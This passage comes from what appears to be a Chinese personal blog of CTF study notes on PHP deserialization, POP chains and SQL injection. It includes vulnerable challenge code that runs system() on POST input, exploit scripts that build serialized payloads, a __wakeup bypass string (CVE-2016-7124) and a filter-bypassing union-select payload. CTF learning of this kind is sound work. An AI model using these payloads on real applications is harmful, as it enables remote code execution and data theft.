class="hljs-variable">$useful13</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful14</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful15</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful16</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful17</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful18</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful19</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful20</span>;<br><br>        <span class="hljs-comment">// 魔术方法：当给不存在的属性赋值时触发</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span></span>) </span>&#123;<br>            <span class="hljs-comment">// 检查out对象的useful7属性是否存在</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;out-&gt;useful7) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Seven is my lucky number&lt;br&gt;&quot;</span>;<br>                <span class="hljs-comment">// 执行系统命令whoami</span><br>                <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 魔术方法：当对象被当作字符串使用时触发</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This is your future.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-comment">// 执行POST参数wow指定的系统命令</span><br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;wow&quot;</span>]);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;win&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 析构函数</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;no = <span class="hljs-string">&quot;no&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;no;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 检查filename参数指定的文件是否存在</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Focus on the previous step!&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">// 如果文件不存在，去掉filename参数最后4个字符</span><br>        <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>],<span class="hljs-number">0</span>,-<span class="hljs-number">4</span>);<br>        <span class="hljs-comment">// 对处理后的数据进行5次base64解码后反序列化</span><br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">best64_decode</span>(<span class="hljs-variable">$data</span>));<br>    &#125;<br><br>    <span class="hljs-comment">// 注释提示：你昨天学习，今天选择，能到达你的未来吗？</span><br>    <span class="hljs-comment">// You learn yesterday, you choose today, can you get to your future?</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>给d导解析了一下，没直接给出能用的payload，但是思路看了一下应该没问题，先调用yesterday 里的__destruct，里面调用了一个hard方法，对应today的_call，然后是当md5调用类时会将其当成字符串调用，对应future里的_toString，然后_toString里直传参wow即可  </p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">yesterday</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$learn</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$study</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$try</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">today</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$doing</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$done</span>=<span class="hljs-string">&#x27;test&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">tommoraw</span></span>&#123;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">future</span></span>&#123;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> yesterday;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> today;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> tommoraw;<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> future;<br><br><span class="hljs-comment">// 正确的属性赋值方式</span><br><span class="hljs-variable">$a</span>-&gt;study = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;doing=<span class="hljs-variable">$d</span>;<br><br><span class="hljs-comment">// 先序列化，再多层base64编码</span><br><span class="hljs-variable">$serialized</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$p</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$serialized</span>)))));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$p</span>.<span class="hljs-string">&#x27;aaaa&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>然后再post里传wow来运行即可<br>wow&#x3D;cat &#x2F;flag;</p>
<hr>
<h2 id="title-note-nssctf-01date-2025-03-17-22-01-05tags-nssctf"><a href="#title-note-nssctf-01date-2025-03-17-22-01-05tags-nssctf" class="headerlink" title="title: note-nssctf-01date: 2025-03-17 22:01:05tags: nssctf"></a>title: note-nssctf-01<br>date: 2025-03-17 22:01:05<br>tags: nssctf</h2><h1 id="SWPUCTF-2022-新生赛-ez-sql"><a href="#SWPUCTF-2022-新生赛-ez-sql" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_sql"></a>[SWPUCTF 2022 新生赛]ez_sql</h1><p>题目说参数为nss，get传nss&#x3D;1<br>提示要用更安全的传参法，那就post了<br>post:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">nss=<span class="hljs-number">1</span><span class="hljs-string">&#x27;  //报错</span><br><span class="hljs-string">nss=1&#x27;</span><span class="hljs-comment">#  //成功闭合</span><br></code></pre></td></tr></table></figure>
<p>用联合注入发现被过滤了union，空格<br>双写绕过即可<br>爆字段payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">nss=<span class="hljs-string">&#x27; uunionnion/**/select/**/1,database(),group_concat(column_name)from/**/infoorrmation_schema.columns/**/where/**/table_name=&#x27;</span>NSS_tb<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure>
<p>到这步就差不多了</p>
<hr>
<h2 id="title-note-反序列化-00date-2025-03-18-22-36-05tags"><a href="#title-note-反序列化-00date-2025-03-18-22-36-05tags" class="headerlink" title="title: note-反序列化-00date: 2025-03-18 22:36:05tags: "></a>title: note-反序列化-00<br>date: 2025-03-18 22:36:05<br>tags: </h2><h1 id="java反序列化notice"><a href="#java反序列化notice" class="headerlink" title="java反序列化notice"></a>java反序列化notice</h1><p>现在理解的反序列大概就是传入一串字符，经java的处理变成能执行的语句，实现rec  </p>
<blockquote>
<p>序列化指的是将对象或数据结构转换为可存储或传输的格式的过程，实现的方法是writeObject()；反序列化则反之，实现的方法是readObject()，可以简单地理解为将文件压缩和解压缩的过程。</p>
</blockquote>
<blockquote>
<p>与PHP中反序列互相触发魔法函数导致的漏洞成因不同，java反序列化漏洞的成因主要是由于java序列化和反序列化机制的设计特点所致，简单地讲，只要反序列化代码中含有危险的命令代码，且该代码的参数是可控的，那它就存在该漏洞。</p>
</blockquote>
<blockquote>
<p>漏洞原理在我今天这里不是重要的，我主要想记录的是该漏洞的利用方式。</p>
</blockquote>
<blockquote>
<p>通常在解题中如果你看到一段字符串以rO0AB开头，那它是java序列化后base64编码的数据；如果一段字符串以aced开头，那它是java序列化后十六进制的数据，碰到这两种情况都基本可以认定该题考点为java反序列化漏洞，如果有直接接受该字符串的输入点，就可以尝试用链子直接打。</p>
</blockquote>
<blockquote>
<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64893612/article/details/136378608">https://blog.csdn.net/m0_64893612/article/details/136378608</a></p>
</blockquote>
<h2 id="SWPUCTF-2021-新生赛-no-wakeup-学习笔记："><a href="#SWPUCTF-2021-新生赛-no-wakeup-学习笔记：" class="headerlink" title="[SWPUCTF 2021 新生赛]no_wakeup 学习笔记："></a>[SWPUCTF 2021 新生赛]no_wakeup 学习笔记：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HaHaHa</span></span>&#123;<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;passwd);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">&quot;wllm&quot;</span>)&#123;<br>                <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No wake up&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br><span class="hljs-variable">$Letmeseesee</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Letmeseesee</span>);<br>```  <br>  <br></code></pre></td></tr></table></figure>


<p>大概是get一个p参数，传给$Letmeseesee然后反序列化，可能p经过反序列化后会变成一个名为this的变量，里面包含有{admin,passwd},其中passwd经过sha1计算再赋值给原来的passwd，当this里的admin&#x3D;&#x3D;&#x3D;admin，经过sha1计算的passwd&#x3D;&#x3D;&#x3D;wllm时就会输出flag</p>
<p>KIMI：</p>
<blockquote>
<p>你的审计思路基本正确，但有一些细节需要澄清：<br>反序列化后的对象状态：<br>当用户传入的p参数被反序列化后，如果它是一个HaHaHa类的对象，那么__wakeup()方法会被调用，此时$passwd的值会被更新为sha1($passwd)。<br>因此，$passwd的值在反序列化后会被哈希处理，而不是直接使用传入的值。<br>条件判断：<br>在析构方法中，判断条件是$admin &#x3D;&#x3D;&#x3D; “admin”且$passwd &#x3D;&#x3D;&#x3D; “wllm”。<br>因此，攻击者需要构造一个对象，使得反序列化后$admin为”admin”，并且$passwd在经过sha1()哈希后等于”wllm”。  </p>
</blockquote>
<p>然而怎么可能会有在经过sha1处理后的到wllm的值。<br>所以要绕过这个__wakeup()</p>
<p><strong>__wakeup() 的作用</strong><br>反序列化时的初始化：<br>当一个对象被序列化后，其状态会被保存为字符串。在反序列化时，对象的状态会被恢复，但某些资源（如数据库连接）可能无法直接序列化，因此需要在反序列化后重新初始化这些资源。<br>__wakeup() 方法正是为此设计的，它允许你在对象恢复后执行一些必要的操作。<br>数据处理：<br>在反序列化后，你可能需要对对象的某些属性进行处理。例如，对敏感数据进行解密，或者对某些属性进行格式转换。</p>
<p>所以大概就是当触发反序列化时__wakeup就会调用这个sha1.</p>
<p>网上正确的payload：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">?p=O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;HaHaHa&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;passwd&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;wllm&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p>学习notice：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>：表示这是一个对象（Object）。  <br><span class="hljs-attribute">O</span>:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;HaHaHa&quot;</span>：表示这是一个类名为HaHaHa的对象，类名长度为<span class="hljs-number">6</span>。  <br><span class="hljs-attribute">3</span>：表示对象有<span class="hljs-number">3</span>个属性。  <br><span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;：第一个属性名为admin，值为admin。  <br><span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;passwd&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;wllm&quot;</span>;：第二个属性名为passwd，值为wllm。  <br></code></pre></td></tr></table></figure>
<p>这个payload能够绕过__wakeup()方法的原因可能与PHP反序列化过程中的一些特性或漏洞有关，比如属性个数不匹配（CVE-2016-7124）。<br>在这个漏洞中，如果序列化字符串中指定的属性个数比实际类中定义的属性个数多，PHP在反序列化时可能会绕过__wakeup()方法的执行。</p>
<p><strong>绕过原理</strong><br>由于修改了属性个数，PHP在反序列化时会跳过__wakeup()方法的执行。因此，passwd属性的值不会被SHA-1哈希处理，而是直接保留为wllm。当对象被销毁时，__destruct()方法会检查admin和passwd的值，发现它们满足条件，从而包含flag.php并输出flag。<br>通过这种方式，攻击者成功绕过了__wakeup()方法，直接设置了所需的属性值，触发了敏感文件的包含。</p>
<p>我的理解就是：<br>构造一个被java序列化后的数值来满足条件，并且使用定义与实际的的属性个数不同来绕过wakeup(),因为wakeup根本就是不想让你过的</p>
<p>O:6:”HaHaHa”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:10:”wllm”;}<br>其中s是字符串长度，2代表里面有两个元素：admin&#x3D;admin，passwd&#x3D;wllm。<br>吧2改成其它超过实际元素的值即可绕过wakeup()<br>就是要大过2，不知道为什么不能小于2</p>
<hr>
<h2 id="title-note-反序列化-01date-2025-03-19-18-49-19tags"><a href="#title-note-反序列化-01date-2025-03-19-18-49-19tags" class="headerlink" title="title: note-反序列化-01date: 2025-03-19 18:49:19tags:"></a>title: note-反序列化-01<br>date: 2025-03-19 18:49:19<br>tags:</h2><p>pop链，我也不知道是什么</p>
<blockquote>
<p>POP链就是利用魔法方法在里面进行多次跳转然后获取敏感数据的一种payload，实战应用范围暂时没遇到，不过在CTF比赛中经常出现这样的题目，同时也经常与反序列化一起考察，可以理解为是反序列化的一种拓展，泛用性更强，涉及到的魔法方法也更多。  </p>
</blockquote>
<h1 id="SWPUCTF-2021-新生赛-pop-1"><a href="#SWPUCTF-2021-新生赛-pop-1" class="headerlink" title="[SWPUCTF 2021 新生赛]pop"></a>[SWPUCTF 2021 新生赛]pop</h1><p>我想tag可以有：pop链，反序列化<br>原题：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;index.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;aaa&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;123456&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Getflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd ===<span class="hljs-string">&#x27;08067&#x27;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nono&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;w00m;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w22m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;w22m&#125;();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$w00m</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w00m&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$w00m</span>);<br></code></pre></td></tr></table></figure>

<p>学了大佬的wp <a target="_blank" rel="noopener" href="https://blog.csdn.net/u010723806/article/details/142340216">https://blog.csdn.net/u010723806/article/details/142340216</a><br>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>&#123;<br>	<span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;w44m&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;08067&#x27;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w22m</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w22m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w33m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m-&gt;w00m=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w44m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m-&gt;w22m=<span class="hljs-string">&#x27;Getflag&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>看完后应该是因为只能传w00m的值，而w44m中无法直接传入，要通过一场串相互关联的类才能传入，这大概就是pop链吧  </p>
<p>先是 w22m 和 w33m 都能传入w00m，</p>
<blockquote>
<p>$this-&gt;w00m-&gt;{$this-&gt;w22m}(); 最终的效果是动态调用 $this-&gt;w00m 对象中的一个方法，方法的名称由 $this-&gt;w22m 决定。而 这条语句的意思就是调用了在w33m里的w00m属性（这里是w00m类）中的w22m方法。</p>
</blockquote>
<h2 id="为什么先赋值-w22m"><a href="#为什么先赋值-w22m" class="headerlink" title="为什么先赋值 w22m  "></a><strong>为什么先赋值 w22m</strong>  </h2><p><strong>利用 w22m 的 __destruct 方法：</strong><br>w22m 类的 __destruct 方法会输出 $this-&gt;w00m。<br>当 PHP 脚本结束时，或者当对象被销毁时，__destruct 方法会被自动调用。<br>这意味着，当我们反序列化一个 w22m 对象时，__destruct 方法会立即执行，从而触发后续的操作。  </p>
<p><strong>触发 w33m 的 __toString 方法：</strong><br>w22m 的 __destruct 方法输出 $this-&gt;w00m，而 $this-&gt;w00m 是一个 w33m 对象。<br>当 PHP 需要将一个对象转换为字符串时（例如在 echo 中），会自动调用该对象的 __toString 方法。<br>因此，w33m 的 __toString 方法会被调用。    </p>
<p><strong>调用 w44m 的 Getflag 方法：</strong><br>w33m 的 __toString 方法中，$this-&gt;w00m-&gt;{$this-&gt;w22m}() 会被执行。<br>这里的 $this-&gt;w00m 是一个 w44m 对象，而 $this-&gt;w22m 是字符串 ‘Getflag’。<br>因此，w44m 的 Getflag 方法会被调用。  </p>
<h2 id="我的理解是：整个构造的最终目的是为了执行-w44m-类中的-Getflag-方法"><a href="#我的理解是：整个构造的最终目的是为了执行-w44m-类中的-Getflag-方法" class="headerlink" title="我的理解是：整个构造的最终目的是为了执行 w44m 类中的 Getflag 方法  "></a>我的理解是：整个构造的最终目的是为了执行 w44m 类中的 Getflag 方法  </h2><blockquote>
<p>对于__toString()，要求是在它类里的变量被实例化时才会被触发。所以$p-&gt;w00m &#x3D; new w33m();则不会触发__toString()。而后面$a-&gt;w00m-&gt;w00m&#x3D;new w44m();语句为w33m类中的变量实例化后，才能使_toString()方法可被调用，进一步让$a-&gt;w00m-&gt;w22m&#x3D;’Getflag’;语句生效。</p>
</blockquote>
<blockquote>
<p>当我们传递的参数中含有private变量时，一定要url编码一下，否则会有不可见字符导致解析出错。</p>
</blockquote>
<p>这是我猜测后端代码接收到传入后的样子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> (w00m)<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> (<span class="hljs-title">w00m</span>)<span class="hljs-title">w44m</span></span>&#123;<br><br>            <span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;w44m&#x27;</span>;<br>            <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;08067&#x27;</span>;<br>        <br>            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Getflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd ===<span 